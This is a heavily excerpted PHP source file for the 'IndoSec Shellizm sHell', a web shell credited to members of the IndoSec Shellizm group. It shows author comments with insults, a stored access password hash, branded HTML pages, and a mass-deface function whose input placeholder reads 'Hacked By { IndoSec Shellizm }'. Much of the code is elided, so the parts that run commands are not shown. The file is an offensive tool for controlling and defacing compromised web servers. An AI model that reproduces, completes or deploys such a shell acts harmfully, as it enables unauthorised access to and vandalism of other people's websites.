...
<?php
/*
	* Konsep Shell : Brillyan -Founder { IndoSec Shellizm }-
	* Pembuat : Holiq - { IndoSec Shellizm }
	
	* Re-Code Boleh Asal Dah Izin Sama Pembuat, Ganti Author & Re-Code Tanpa Seizin Pembuat... Fix Lo Noob Anjenk
	* Klo Kga Bisa Bikin Cek Chanel IndoSec Shellizm, Ada Tutornya, Jangan Cuma Bisa Ganti Author Doank Bangsad
	* https://www.youtube.com/playlist?list=PLAAbQaUpDeM7nGwS6WfaTm_cPC3RUiswi

	* Thanks For All Member { IndoSec Shellizm }, Yang Telah Membantu Proses Pembuatan Shell,Dan Dari Shell Lain Untuk Inspirasinya

	* { IndoSec Shellizm sHell }
	* �2019 { IndoSec Shellizm } -Holiq-
...
/* Configurasi */
$aupas 			= "9efd93a2b70ceeb960b700893dd65b6c";// İndoSec
...
<html>
	<head>
		...
		<meta name="copyright" content="{ IndoSec Shellizm }"/>
		<title>{ IndoSec Shellizm sHell }</title>
	...
	<body class="bg-dark text-center text-light">
		...
		<a href="https://facebook.com/IndoSecOfficial" class="text-muted fixed-bottom mb-3">Copyright 2019 @ { IndoSec Shellizm }</a>
	</body>
</html>
<?php
exit;
...
function about(){
	echo '<div class="card text-center bg-light about">
		<h4 class="card-header">{ IndoSec Shellizm }</h4>
		<div class="card-body">
			<center><div class="img"></div></center>
			<p class="card-text">{ IndoSec Shellizm } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
		</div>
		<div class="card-footer">
			<small class="card-text text-muted">Copyright 2019 { IndoSec Shellizm }</small>
		</div>
	</div><br/>';
	exit;
}
...
function aksiMasdef($dir,$file,$imgfol,$imgfile){
	...
	if($_POST['start']){
		...
		echo "<form method='post'>
			...
			<textarea name='script' class='form-control' rows='13' placeholder='[Ex] Hacked By { IndoSec Shellizm }'></textarea><br/>
		...
		<nav class="navbar static-top navbar-dark">
			...
			<div class="collapse navbar-collapse" id="info">
				<ul>
					...
					<a href="https://www.youtube.com/IndoSec Shellizm" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
...
';
				...
				echo '</table></div><hr/>
				<center><a class="text-muted" href="https://shellizm.com/">Copyright 2019 { IndoSec Download Shellizm }</a></center><br/>';	
